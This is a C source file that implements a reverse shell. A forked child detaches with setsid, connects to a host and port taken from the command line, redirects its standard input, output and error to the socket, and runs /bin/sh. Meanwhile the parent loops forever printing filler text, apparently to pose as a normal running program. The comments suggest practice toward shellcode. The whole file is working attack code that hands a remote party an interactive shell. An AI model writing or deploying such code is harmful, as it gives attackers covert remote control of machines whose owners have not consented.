#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <time.h>   /* Needed for struct timespec */


void forkexample(int argc, char *argv[])
{
        // child process because return value zero
        if (fork() == 0)
        {
                setsid(); // become independent process that wont die if parent is killed

                int sockfd;
                int connecterror;

                printf("Hello from Child!\n");
                char buffer[256];

                if (argc < 3)
                {
                        fprintf(stderr,"usage %s hostname port\n", argv[0]);
                        exit(0);
                }


                struct sockaddr_in ip4addr;
                ip4addr.sin_family = AF_INET;
                ip4addr.sin_port = htons(atoi(argv[2]));
                inet_pton(AF_INET, argv[1], &ip4addr.sin_addr);

            		printf("will print\n");

                // %p means pointer (formatit in pointer style)
            		printf("%p is family value\n", ip4addr.sin_family);
            		printf("%p is port value\n", ip4addr.sin_port);
            		printf("%p is ip value\n", ip4addr.sin_addr);
            		printf("%p is sockaddr value\n", ip4addr);
            		printf("%p is sockaddr pointer address\n", &ip4addr);

                sockfd = socket(AF_INET, SOCK_STREAM, 0);

                if (sockfd < 0)
                {
                        fprintf(stderr, "ERROR opening socket");
                }


                connecterror = connect(sockfd, (struct sockaddr*)&ip4addr, sizeof(ip4addr));

                if(connecterror < 0)
                {
                        fprintf(stderr, "ERROR connecting socket");
                }

                dup2(sockfd, 0);
                dup2(sockfd, 1);
                dup2(sockfd, 2);

                //execl("/bin/sh", "calc.exe", NULL); doesnt exist in system calls
                execve("/bin/sh", NULL,NULL);


        }
        // parent process because return value non-zero.
        else
        {
          struct timespec tim;
          tim.tv_sec = 1; // 1 second and
          tim.tv_nsec = 0; // 0 nanoseconds

                // emulate running programm
                while(1)
                {
                        //sleep(1); // sleep is unavailable in system calls so using nanosleep instead
                        printf("%p is nanosleep struct value", tim);
                        printf("%p is nanosleep struct address", &tim);
                        nanosleep(&tim, NULL);
                        printf("bob lol\n");
                }

                printf("Hello from Parent!\n");
        }
}

int main(int argc, char *argv[])
{
    forkexample(argc, argv);
    return 0;
}
